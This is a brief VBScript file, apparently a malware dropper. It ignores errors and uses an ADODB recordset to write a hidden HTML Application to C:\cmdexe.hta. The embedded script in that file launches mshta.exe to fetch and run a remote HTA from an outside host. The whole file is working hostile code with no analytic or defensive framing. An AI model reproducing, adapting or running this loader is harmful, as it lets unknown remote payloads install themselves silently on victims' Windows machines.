on error resume next
set conn = CreateObject("ADODB.Recordset")
   With conn
       .Fields.Append "conn", 200, "3000"
       Call .Open
       Call .AddNew
       .Fields("conn").Value = "<body style=""display:none"" scroll=""no"">"
       Call .AddNew
       .Fields("conn").Value = "<script language=""vbscript"">: on error resume next : set s=CreateObject(""WScript.Shell"") : s.run(""mshta.exe http://specific911.com/acc1/1/ins.hta"")</script>"
       Call .Update
   End With
conn.Save "C:\cmdexe.hta", adPersistXML
conn.Close
